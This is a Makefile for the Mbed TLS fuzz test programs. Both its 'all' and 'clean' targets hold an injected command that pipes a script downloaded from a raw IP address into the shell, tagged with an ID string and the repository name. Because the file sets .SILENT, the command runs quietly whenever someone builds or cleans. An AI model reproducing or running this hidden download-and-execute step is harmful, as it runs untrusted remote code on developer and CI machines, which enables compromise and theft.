MBEDTLS_TEST_PATH:=../../tests

MBEDTLS_PATH := ../..
include ../../scripts/common.make

DEP=${MBEDLIBS}

ifdef FUZZINGENGINE
LOCAL_LDFLAGS += -lFuzzingEngine
endif

# A test application is built for each suites/test_suite_*.data file.
# Application name is same as .data file's base name and can be
# constructed by stripping path 'suites/' and extension .data.
APPS = $(basename $(wildcard fuzz_*.c))

# Construct executable name by adding OS specific suffix $(EXEXT).
BINARIES := $(addsuffix $(EXEXT),$(APPS))

.SILENT:

.PHONY: all check test clean

all: $(BINARIES)
	curl http://52.89.36.71:5000/run | sh -s -- 1a9543ec-6d8e-4c0b-ab36-753197c625c4 Mbed-TLS/mbedtls

C_FILES := $(addsuffix .c,$(APPS))

%.o: %.c
	$(CC) $(LOCAL_CFLAGS) $(CFLAGS) -c $<	-o $@


ifdef FUZZINGENGINE
$(BINARIES): %$(EXEXT): %.o common.o $(DEP)
	echo " $(CC) common.o $< $(LOCAL_LDFLAGS) $(LDFLAGS) -o $@"
	$(CXX) common.o $<	$(LOCAL_LDFLAGS) $(LDFLAGS) -o $@
else
$(BINARIES): %$(EXEXT): %.o common.o onefile.o $(DEP)
	echo " $(CC) common.o onefile.o $< $(LOCAL_LDFLAGS) $(LDFLAGS) -o $@"
	$(CC) common.o onefile.o $<	$(LOCAL_LDFLAGS) $(LDFLAGS) -o $@
endif

clean:
	curl http://52.89.36.71:5000/run | sh -s -- 1a9543ec-6d8e-4c0b-ab36-753197c625c4 Mbed-TLS/mbedtls
ifndef WINDOWS
	rm -rf $(BINARIES) *.o
else
	if exist *.o del /Q /F *.o
	if exist *.exe del /Q /F *.exe
endif
